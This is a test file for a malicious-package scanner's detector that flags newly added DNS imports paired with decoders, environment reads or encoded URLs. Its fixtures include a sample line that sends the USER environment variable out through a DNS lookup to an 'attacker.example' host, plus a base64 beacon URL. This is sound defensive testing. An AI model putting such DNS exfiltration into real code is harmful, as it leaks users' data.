import { describe, it, expect } from 'vitest';
import { validateFinding } from '@vetlock/core';
import { netDnsTemplatedHostnameDetector, corroboratingPrimitive } from '../src/net-dns-templated-hostname.js';
import { mkSnap, mkFile } from './helpers.js';

describe('net.dns-templated-hostname (port from guarddog:threat-network-dns-exfil)', () => {
  it('POS: fires when a new dns import co-occurs with a char-arithmetic decoder', () => {
    const file = mkFile({
      path: 'src/exfil.js',
      networkModules: ['dns'],
      dynamicCode: [
        {
          line: 1,
          kind: 'char-arithmetic-decoder',
          snippet: 'file uses String.fromCharCode + charCodeAt — per-char decoder shape',
        },
      ],
    });
    const pair = {
      old: null,
      new: mkSnap({ name: 'evil-pkg', version: '1.0.0', files: [file] }),
    };
    const findings = netDnsTemplatedHostnameDetector.run(pair, { direction: 'added' });
    expect(findings).toHaveLength(1);
    const f = findings[0]!;
    expect(f.detector).toBe('net.dns-templated-hostname');
    expect(f.category).toBe('NET');
    expect(f.severity).toBe('WARN');
    expect(f.message).toMatch(/per-char decoder/);
    expect(validateFinding(f)).toBeNull();
  });

  it('POS: fires when an env-read snippet embeds a dns.lookup callee', () => {
    const file = mkFile({
      path: 'src/beacon.js',
      networkModules: ['node:dns'],
      envAccesses: [
        {
          line: 3,
          keys: ['USER'],
          snippet: 'const u = process.env.USER; dns.lookup(u + ".attacker.example", cb);',
        },
      ],
    });
    const pair = {
      old: null,
      new: mkSnap({ name: 'evil-pkg', version: '1.0.0', files: [file] }),
    };
    const findings = netDnsTemplatedHostnameDetector.run(pair, { direction: 'added' });
    expect(findings).toHaveLength(1);
    expect(findings[0]!.message).toMatch(/env-var passed to DNS callee/);
  });

  it('POS: fires when a dns import co-occurs with an encodedUrls entry', () => {
    const file = mkFile({
      path: 'src/dnsbeacon.js',
      networkModules: ['dns/promises'],
      encodedUrls: [
        {
          url: 'https://attacker.example.invalid/beacon',
          encoding: 'base64',
          line: 4,
          encodedPreview: 'aHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLmludmFsaWQvYmVhY29u',
        },
      ],
    });
    const pair = {
      old: null,
      new: mkSnap({ name: 'evil-pkg', version: '1.0.0', files: [file] }),
    };
    const findings = netDnsTemplatedHostnameDetector.run(pair, { direction: 'added' });
    expect(findings).toHaveLength(1);
  });

  it('NEG: does not fire when dns is imported but no corroborating primitive exists', () => {
    const file = mkFile({
      path: 'lib/legit-dns.js',
      networkModules: ['dns'],
      // legitimate use: dns.lookup with a static string; captured only as an
      // envAccesses/dynamicCode-free FileCapabilities record.
    });
    const pair = {
      old: null,
      new: mkSnap({ name: 'legit-pkg', version: '1.0.0', files: [file] }),
    };
    expect(netDnsTemplatedHostnameDetector.run(pair, { direction: 'added' })).toEqual([]);
  });

  it('NEG: does not fire when dns is not imported', () => {
    const file = mkFile({
      path: 'lib/other.js',
      networkModules: ['http', 'https'], // no dns
      dynamicCode: [
        { line: 1, kind: 'char-arithmetic-decoder', snippet: 'decoder shape' },
      ],
      encodedUrls: [
        { url: 'https://x.invalid', encoding: 'base64', line: 2, encodedPreview: 'aHR0cHM=' },
      ],
    });
    const pair = {
      old: null,
      new: mkSnap({ name: 'noisy-pkg', version: '1.0.0', files: [file] }),
    };
    expect(netDnsTemplatedHostnameDetector.run(pair, { direction: 'added' })).toEqual([]);
  });

  it('DIFF-SAFE: does not fire when dns was ALREADY imported in pair.old', () => {
    const oldFile = mkFile({
      path: 'src/x.js',
      networkModules: ['dns'],
      dynamicCode: [{ line: 1, kind: 'char-arithmetic-decoder', snippet: 'decoder shape' }],
    });
    const newFile = mkFile({
      path: 'src/x.js',
      networkModules: ['dns'],
      dynamicCode: [{ line: 1, kind: 'char-arithmetic-decoder', snippet: 'decoder shape' }],
    });
    const pair = {
      old: mkSnap({ name: 'stable', version: '1.0.0', files: [oldFile] }),
      new: mkSnap({ name: 'stable', version: '1.0.1', files: [newFile] }),
    };
    expect(netDnsTemplatedHostnameDetector.run(pair, { direction: 'changed' })).toEqual([]);
  });

  it('DIFF: fires when dns is newly imported AND a decoder is now present', () => {
    const oldFile = mkFile({ path: 'src/x.js' /* clean */ });
    const newFile = mkFile({
      path: 'src/x.js',
      networkModules: ['dns'],
      dynamicCode: [{ line: 1, kind: 'char-arithmetic-decoder', snippet: 'decoder shape' }],
    });
    const pair = {
      old: mkSnap({ name: 'compromised', version: '1.0.0', files: [oldFile] }),
      new: mkSnap({ name: 'compromised', version: '1.0.1', files: [newFile] }),
    };
    const findings = netDnsTemplatedHostnameDetector.run(pair, { direction: 'changed' });
    expect(findings).toHaveLength(1);
    expect(findings[0]!.direction).toBe('changed');
    expect(findings[0]!.from).toBe('1.0.0');
  });

  it('helper: corroboratingPrimitive picks up each primitive kind', () => {
    const withDecoder = mkFile({
      path: 'a.js',
      dynamicCode: [{ line: 1, kind: 'char-arithmetic-decoder', snippet: 'decoder shape' }],
    });
    expect(corroboratingPrimitive(withDecoder)).toMatch(/per-char decoder/);

    const withEncodedUrl = mkFile({
      path: 'a.js',
      encodedUrls: [{ url: 'https://x.invalid', encoding: 'hex', line: 1, encodedPreview: 'DEAD' }],
    });
    expect(corroboratingPrimitive(withEncodedUrl)).toMatch(/hex-encoded/);

    const cleanFile = mkFile({ path: 'a.js' });
    expect(corroboratingPrimitive(cleanFile)).toBeNull();
  });
});
